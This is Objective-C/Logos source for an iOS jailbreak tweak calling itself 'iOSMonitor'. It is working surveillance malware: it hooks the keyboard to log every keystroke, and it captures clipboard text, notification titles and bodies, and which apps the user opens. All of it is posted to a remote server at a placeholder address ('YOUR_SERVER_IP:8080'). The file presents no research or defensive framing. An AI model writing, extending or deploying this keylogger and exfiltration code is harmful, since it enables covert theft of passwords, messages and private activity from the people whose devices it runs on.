#import <UIKit/UIKit.h>
#import <UserNotifications/UserNotifications.h>

static NSString *serverURL = nil;

// Simple inline HTTP post without daemon dependency
static void postToServer(NSString *endpoint, NSDictionary *params) {
    if (!serverURL) {
        serverURL = [[[NSProcessInfo processInfo] environment] objectForKey:@"SERVER_URL"];
        if (!serverURL) return;
    }
    NSString *urlStr = [NSString stringWithFormat:@"%@/api/ingest/%@", serverURL, endpoint];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 5;

    NSMutableString *body = [NSMutableString string];
    for (NSString *key in params) {
        NSString *value = [[params[key] description] stringByAddingPercentEncodingWithAllowedCharacters:
                          [NSCharacterSet URLQueryAllowedCharacterSet]];
        if (body.length > 0) [body appendString:@"&"];
        [body appendFormat:@"%@=%@", key, value];
    }
    req.HTTPBody = [body dataUsingEncoding:NSUTF8StringEncoding];
    [req setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"Content-Type"];

    [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
}

// ==========================================
// MARK: - Keyboard / Keystroke Logging
// ==========================================

%hook UIKeyboardImpl

- (void)handleKeyEvent:(id)event {
    %orig;
    if ([event respondsToSelector:@selector(keyString)] && [event keyString]) {
        NSString *key = [event keyString];
        NSString *app = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
        if (key.length > 0 && ![key isEqualToString:@"\n"] && ![key isEqualToString:@"\t"]) {
            postToServer(@"keystroke", @{
                @"text": key,
                @"app_name": app
            });
        }
    }
}

%end

%hook UIApplication

- (BOOL)sendAction:(SEL)action to:(id)target from:(id)sender forEvent:(UIEvent *)event {
    // Log when return/enter is pressed (captures completed text input)
    if (action == @selector(insertText:)) {
        // Handled by UIKeyboardImpl hook above
    }
    return %orig;
}

%end

// ==========================================
// MARK: - Clipboard Monitoring
// ==========================================

%hook UIPasteboard

- (void)setItems:(NSArray *)items {
    %orig;
    NSString *app = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
    for (NSDictionary *item in items) {
        for (NSString *type in item) {
            id value = item[type];
            if ([value isKindOfClass:[NSString class]] && [value length] > 0) {
                postToServer(@"clipboard", @{
                    @"text": [value substringToIndex:MIN([value length], 500)],
                    @"app_name": app
                });
                break;
            }
        }
    }
}

- (void)setString:(NSString *)string {
    %orig;
    if (string.length > 0) {
        NSString *app = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
        postToServer(@"clipboard", @{
            @"text": [string substringToIndex:MIN(string.length, 500)],
            @"app_name": app
        });
    }
}

%end

// ==========================================
// MARK: - Notification Monitoring
// ==========================================

%hook UNUserNotificationCenter

- (void)setDelegate:(id<UNUserNotificationCenterDelegate>)delegate {
    %orig;
}

- (void)addNotificationRequest:(UNNotificationRequest *)request
         withCompletionHandler:(void(^)(NSError *error))completionHandler {
    %orig;
    NSString *app = [[NSBundle mainBundle] bundleIdentifier] ?: @"unknown";
    NSString *title = request.content.title ?: @"";
    NSString *body = request.content.body ?: @"";

    if (title.length > 0 || body.length > 0) {
        postToServer(@"notification", @{
            @"app_name": app,
            @"title": title,
            @"body": body
        });
    }
}

%end

// ==========================================
// MARK: - App Usage (via SpringBoard hooks)
// ==========================================

static NSString *lastFrontApp = nil;

%hook SBApplicationController

- (void)_noteApplicationActivated:(id)application {
    %orig;
    NSString *bundleID = [application performSelector:@selector(bundleIdentifier)] ?: @"unknown";
    if (![bundleID isEqualToString:lastFrontApp]) {
        lastFrontApp = bundleID;
        postToServer(@"app_usage", @{
            @"app_name": bundleID,
            @"bundle_id": bundleID,
            @"duration": @1
        });
    }
}

%end

// ==========================================
// MARK: - Constructor
// ==========================================

%ctor {
    serverURL = [[[NSProcessInfo processInfo] environment] objectForKey:@"SERVER_URL"];
    if (!serverURL) {
        serverURL = @"http://YOUR_SERVER_IP:8080";
    }
    NSLog(@"[iOSMonitor] Tweak loaded, server: %@", serverURL);
}
